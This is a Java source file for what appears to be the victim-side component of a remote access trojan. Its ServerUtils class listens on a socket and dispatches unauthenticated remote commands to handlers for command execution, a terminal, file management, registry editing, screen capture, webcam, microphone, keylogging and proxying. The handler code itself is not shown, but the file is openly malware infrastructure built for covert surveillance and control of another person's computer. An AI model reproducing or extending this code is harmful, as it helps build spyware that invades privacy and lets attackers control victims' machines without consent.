package javanet.server;

import java.awt.Toolkit;
import java.io.IOException;
import java.net.Socket;
import java.util.HashMap;
import java.util.logging.Level;
import java.util.logging.Logger;
import javanet.IOUtils;
import javanet.Utils;

/**
 *
 * @author Jackson McClintock
 */
public class ServerUtils {
    
    int screenx = Toolkit.getDefaultToolkit().getScreenSize().width;
    int screeny = Toolkit.getDefaultToolkit().getScreenSize().height;
    Socket socket = null;
    ServerExecute execute = new ServerExecute(this);
    ServerCreateFile create_file = new ServerCreateFile(this);
    ServerCreateDir create_dir = new ServerCreateDir(this);
    ServerFileManager file_manager = new ServerFileManager(this);
    ServerRegedit regedit = new ServerRegedit(this);
    ServerScreen screen = new ServerScreen(this);
    ServerTaskManager task_manager = new ServerTaskManager(this);
    ServerTerminal terminal = new ServerTerminal(this);
    ServerWebcam webcam = new ServerWebcam(this);
    ServerMic mic = new ServerMic(this);
    ServerKeylogger keylogger = new ServerKeylogger(this);
    ServerProxy proxy = new ServerProxy(this);
    ServerDelete delete = new ServerDelete(this);
    ServerRename rename = new ServerRename(this);
    ServerUtils utils = this;
    HashMap<String, Object> functions = new HashMap<>();
    IOUtils io = null;
    final int SLEEP_INTERVAL = 10;
    
    public ServerUtils(Socket socket){
        functions.put("execute", execute);
        functions.put("create_file", create_file);
        functions.put("create_dir", create_dir);
        functions.put("file_manager", file_manager);
        functions.put("regedit", regedit);
        functions.put("screen", screen);
        functions.put("task_manager", task_manager);
        functions.put("terminal", terminal);
        functions.put("webcam", webcam);
        functions.put("mic", mic);
        functions.put("keylogger", keylogger);
        functions.put("proxy", proxy);
        functions.put("delete", delete);
        functions.put("rename", rename);
        for(int i = 0; i < functions.size(); i++){
            ServerFunction temp_function = ((ServerFunction) functions.values().toArray()[i]);
            for(int j = 1; j < temp_function.command_list.length; j++){
                functions.put(temp_function.command_list[j], temp_function);
            }
        }
        this.socket = socket;
        try {
            io = new IOUtils(socket);
        } catch (IOException ex) {
            Logger.getLogger(ServerUtils.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
    public void executeCommand(String full_command){
        String command;
        if(!full_command.contains(":_:_:")){
            command = full_command.substring(0, full_command.indexOf(":^:^:"));
        }else{
            command = full_command.substring(0, full_command.indexOf(":_:_:"));
        }
        System.out.println("Server Recieve: " + command);
        ServerFunction function = (ServerFunction) functions.get(command);
        function.processCommand(Utils.splitToStringArray(full_command));
    }
    public void commandListener(){
        for(;;){
            try {
                String result = Utils.commandListener(io);
                new Thread(){
                    @Override
                    public void run(){
                        executeCommand(result);
                    }
                }.start();
            } catch (IOException ex) {
                Logger.getLogger(ServerUtils.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
    }
}
